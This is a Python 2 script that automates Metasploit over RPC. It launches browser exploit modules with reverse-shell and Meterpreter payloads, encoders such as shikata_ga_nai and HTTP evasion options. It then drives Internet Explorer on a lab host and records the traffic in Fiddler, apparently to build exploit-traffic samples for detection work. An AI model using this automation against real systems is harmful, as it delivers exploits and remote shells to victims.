#!/usr/bin/env python

import os, time, logging
import subprocess
import traceback, copy
import msfrpc
import shutil

FIDDLER_DIR = r"C:\Program Files\Fiddler2"
FIDDLER_MAIN = r"Fiddler.exe"
FIDDLER_EXECACTION = r"ExecAction.exe"

IE_DIR = r"C:\Program Files\Internet Explorer"
IE_MAIN = r"iexplore.exe"

SAZ_ROOT = r"C:\msf_rpc\saz_root"

logger = logging.getLogger('auto_collect_msf_samples')
formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
logger.setLevel(logging.DEBUG)

fh = logging.FileHandler(r'log\collect.log')
fh.setFormatter(formatter)
logger.addHandler(fh)

server_host = '192.168.111.166'
server_port = 55553
user = 'test'
password = '111111'
max_payload_count = 3
saz_name = ''


class Controller:
  """A controller to control access server and set config"""
  def __init__(self):
    self.server_host = server_host
    self.server_port = server_port
    self.user = user
    self.password = password
    self.client = None
    self.failed_list = []
    self.job_list = {}

  def login(self):
    self.client = msfrpc.Msfrpc({'host': self.server_host, 'port': self.server_port})
    return self.client.login(self.user, self.password)

  def startupServer(self, module, option):
    logger.debug('Enter into startupServer')
    if not option['SRVHOST']:
      option['SRVHOST'] = self.server_host
    # self.server_url = r'http://' + option['SRVHOST'] + r'/'
    self.server_url = r'http://' + option['SRVHOST'] + r':' + str(option['SRVPORT']) + r'/'+ option['URIPATH']
    logger.info('Server URL: %s', self.server_url)

    exec_info = self.client.call('module.execute', ['exploit', module, option])
    logger.debug('return value of execute: %s', exec_info)
    logger.debug('job ID: %d', exec_info['job_id'])
    if not exec_info['job_id']:
      #print exec_info
      #print "### %s module failed, URL: %s, job ID: %d" % (module, option['URIPATH'], exec_info['job_id'])
      self.failed_list.append({module: option})
    else:
      #print ">>> %s module ran, URL: %s, job ID: %d" % (module, option['URIPATH'], exec_info['job_id'])
      pass

  def check_payload(self, module, payload):
    exec_info = self.client.call('module.execute', ['exploit', module, payload])
    if not exec_info['job_id']:
        return False
    else:
        return True

  def closeAllJobs(self):
    self.job_list = self.client.call('job.list', [])
    for job in self.job_list:
      self.client.call('job.stop', [job])

  def getURL(self):
    return self.server_url

  def readModuleList(self, file_path):
    f = open(file_path, 'r')
    return f.readlines()

  def clearIECache(self):
    os.system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1") # Deletes History
    os.system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2") # Deletes Cookies
    os.system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8") # Deletes Temporary Internet Files
    #os.system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16") # Deletes Form Data
    #os.system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32") # Deletes Password History

  def getEncoders(self):
    encoder_info = []
    encoder_list = self.client.call('module.encoders')
    BDS_encoder_list = ['x86/call4_dword_xor', 'x86/countdown', 'x86/fnstenv_mov', 'x86/jmp_call_additive', 'x86/shikata_ga_nai', 'x86/Veil Evasion Framework']
    for each_encoder in BDS_encoder_list:
      if each_encoder in encoder_list['modules']:
        encoder_info.append(each_encoder)
    encoder_info.append("no_encoder")
    return encoder_info


  def setPayloadOption(self,payload_item):
    payload = payload_item["PAYLOAD"]
    if payload in ['windows/messagebox', 'generic/debug_trap','firefox/exec',"windows/shell_bind_tcp","windows/download_exec"]:
      pass
    elif payload in ['windows/exec', 'windows/x64/exec']:
      payload_item['CMD'] = 'calc.exe'
    elif payload in ["generic/shell_bind_tcp"]:
      payload_item['LPORT'] = 4567
    elif payload in ['generic/shell_reverse_tcp', 'windows/x64/shell/reverse_tcp', "java/meterpreter/reverse_http"
                      ,"java/shell/reverse_tcp", "java/meterpreter/reverse_https" ,"java/shell_reverse_tcp",
                     "java/meterpreter/reverse_tcp", "java/meterpreter/bind_tcp","windows/vncinject/reverse_winhttp",
                     "windows/vncinject/reverse_tcp_uuid","windows/vncinject/reverse_tcp_rc4_dns",
                     "windows/vncinject/reverse_tcp_rc4","windows/vncinject/reverse_tcp_allports",
                     "windows/vncinject/reverse_ord_tcp","windows/vncinject/reverse_nonx_tcp",
                     "windows/shell/reverse_tcp_dns","windows/meterpreter/reverse_ord_tcp"]:
      payload_item['LHOST'] = self.server_host
      payload_item['LPORT'] = 4567
    elif payload in ["generic/tight_loop", "windows/vncinject/bind_tcp"]:
      pass
    elif payload in ["windows/upexec/bind_tcp"]:
      payload_item["PEXEC"]= "/test.exe" # the root dir of server should have test.exe
      payload_item['LPORT'] = 4567
    elif payload in ["windows/upexec/reverse_tcp_uuid","windows/upexec/reverse_tcp",
                     "windows/upexec/reverse_tcp_dns","windows/upexec/reverse_tcp_allports"]:
      payload_item["PEXEC"]= "/test.exe"
      payload_item['LHOST'] = self.server_host
      payload_item['LPORT'] = 4567
    else:
      raise "not find payload config in setPayloadOption:", payload
      return False
    return True

  def getCompatiblePayloads(self, module):
    # only provide following payloads

    payload_info = []
    payload_list = self.client.call('module.compatible_payloads', [module])
    #this list define the payload you want to use
    target_payload = ["java/meterpreter/reverse_https"]
    #target_payload = ['windows/exec', 'windows/x64/exec', 'windows/messagebox', 'generic/debug_trap' ,
    #                  'firefox/exec',"generic/shell_bind_tcp",'generic/shell_reverse_tcp',
    #                  'windows/x64/shell/reverse_tcp', "java/meterpreter/reverse_http" ,
    #                  "java/shell/reverse_tcp", "java/meterpreter/reverse_https" ,
    #                  "java/shell_reverse_tcp", "java/meterpreter/reverse_tcp", "java/meterpreter/bind_tcp"]
    print "payload list"
    for payload in target_payload:
      if payload in payload_list["payloads"]:
        payload_item = {'PAYLOAD': payload}
        if self.setPayloadOption(payload_item) == True:
          if self.check_payload(module, payload_item):
            print payload_item["PAYLOAD"]
            payload_info.append(payload_item)
            if len(payload_info) == max_payload_count:
              break
    return payload_info

  def getCompatibleEvasions(self, module):
    evasion_list = []
    evasion_option = {
    'HTML::base64': 'none',           # Accepted: none, plain, single_pad, double_pad, random_space_injection
    'HTML::javascript::escape': 0,    # number of iterations
    'HTML::unicode': 'none',          # Accepted: none, utf-16le, utf-16be, utf-16be-marker, utf-32le, utf-32be
    'HTTP::chunked': 'false',
    'HTTP::compression': 'none',      # Accepted: none, gzip, deflate
    'HTTP::header_folding': 'false',
    'HTTP::junk_headers': 'false',
    'HTTP::server_name': 'Apache',
    'TCP::max_send_size': 0,
    'TCP::send_delay': 0
    }
    # append no evasion
    evasion_list.append({'name':'no_evasion', 'option':evasion_option})

    '''
    # append js escape
    option_js_escape_1 = copy.copy(evasion_option)
    option_js_escape_1['HTML::javascript::escape'] = 1
    evasion_list.append({'name':'js_escape', 'option':option_js_escape_1})
    if -1 != module.find('mozilla') or -1 != module.find('firefox'):
      # base64_plain
      option_base64_plain = copy.copy(evasion_option)
      option_base64_plain['HTML::base64'] = 'plain'
      evasion_list.append({'name':'base64_plain', 'option':option_base64_plain})
      # base64_single_pad
      option_base64_1pad = copy.copy(evasion_option)
      option_base64_1pad['HTML::base64'] = 'single_pad'
      evasion_list.append({'name':'base64_single_pad', 'option':option_base64_1pad})
      # base64_double_pad
      option_base64_2pad = copy.copy(evasion_option)
      option_base64_2pad['HTML::base64'] = 'double_pad'
      evasion_list.append({'name':'base64_double_pad', 'option':option_base64_2pad})
      # base64_random_space_injection
      option_base64_random = copy.copy(evasion_option)
      option_base64_random['HTML::base64'] = 'random_space_injection'
      evasion_list.append({'name':'base64_random_space_injection', 'option':option_base64_random})
    # utf_16le
    option_utf_16le = copy.copy(evasion_option)
    option_utf_16le['HTML::unicode'] = 'utf-16le'
    evasion_list.append({'name':'utf_16le', 'option':option_utf_16le})
    # utf-16be
    option_utf_16be = copy.copy(evasion_option)
    option_utf_16be['HTML::unicode'] = 'utf-16be'
    evasion_list.append({'name':'utf_16be', 'option':option_utf_16be})
    # utf-32le
    option_utf_32le = copy.copy(evasion_option)
    option_utf_32le['HTML::unicode'] = 'utf-32le'
    evasion_list.append({'name':'utf_32le', 'option':option_utf_32le})
    # utf-32le
    option_utf_32be = copy.copy(evasion_option)
    option_utf_32be['HTML::unicode'] = 'utf-32be'
    evasion_list.append({'name':'utf_32be', 'option':option_utf_32be})
    '''
    return evasion_list


  def runSingle(self, module, option):
    logger.debug('Enter into runSingle')
    logger.debug('module: %s', module)
    logger.debug('option: %s', option)

    # close all jobs before starting server
    self.closeAllJobs()
    # start a HTTP server
    self.startupServer(module, option)

    # clear Fiddler
    ori_dir = os.getcwd()
    os.chdir(FIDDLER_DIR)
    cmd_clear_sessions = '"{0} \"{1}\""'.format(FIDDLER_EXECACTION, 'clear')
    os.system(cmd_clear_sessions)

    # clear IE cache
    self.clearIECache()

    # start IE to access URL, wait for 3 seconds and kill process
    os.chdir(IE_DIR)
    proc_access_url = subprocess.Popen([IE_MAIN, ctl.getURL()])
    time.sleep(13)
    proc_access_url.terminate()

    # save traffic
    os.chdir(FIDDLER_DIR)
    saz_dest = os.path.join(SAZ_ROOT,saz_name + ".saz")
    logger.info('Save SAZ: %s', saz_dest)

    cmd_save_traffic = '"{0} \"{1}\""'.format(FIDDLER_EXECACTION, 'savesaz '+saz_dest)
    os.system(cmd_save_traffic)

    os.chdir(ori_dir)
    # check if SAZ exists and file size
    # if cannot find SAZ or file size < 3KB
    if not os.path.exists(saz_dest):
      logger.debug('Cannot find SAZ: %s', saz_dest)
      logger.critical("Extract sample failed! Module: %s, Payload: %s", module, option['PAYLOAD'])
    elif os.path.getsize(saz_dest) < 3*1024:
      logger.critical("SAZ file size < 3KB! Module: %s, Payload: %s", module, option['PAYLOAD'])

if __name__ == '__main__':
  if not os.path.exists(SAZ_ROOT):
    os.makedirs(SAZ_ROOT)
  ctl = Controller()
  if not ctl.login():
    print 'Login failed!!!'
    exit(-1)

  encoder_list = ctl.getEncoders()
  for module_name in ctl.readModuleList(r'modules.cfg'):
    # support comment line
    if module_name[0] == '#' or (module_name[0] == '/' and module_name[1] == '/'):
      continue
    if module_name[-1] == '\n':
      module_name = module_name[0:-1]

    # get payload and evasion from module
    payload_list = ctl.getCompatiblePayloads(module_name)
    evasion_list = ctl.getCompatibleEvasions(module_name)

    module_last_name = module_name.split('/')[-1]
    count = 0
    print payload_list
    for payload in payload_list:
      option = {
        'URIPATH': module_last_name,
        'SRVHOST': server_host,
        'SRVPORT': 8080,
      }
      for evasion in evasion_list:
        for each_encoder in encoder_list:
          encoder_last_name = each_encoder.split('/')[-1]
          saz_name = module_last_name + '__' + payload['PAYLOAD'].replace('/','_') + '__' + evasion['name'] + '__' + encoder_last_name
          option.update(payload)
          option.update(evasion['option'])
          if each_encoder != "no_encoder":
            option.update({"encoder" : each_encoder})
          module = module_name[module_name.find('/')+1:]
          logger.info("start generate sample")
          try:
            count += 1
            pass
            ctl.runSingle(module, option)
          except Exception, e:
            logger.critical("Extract sample failed! Module: %s, Payload: %s", module, option['PAYLOAD'])
            logger.error(traceback.format_exc())
    print "count:",count

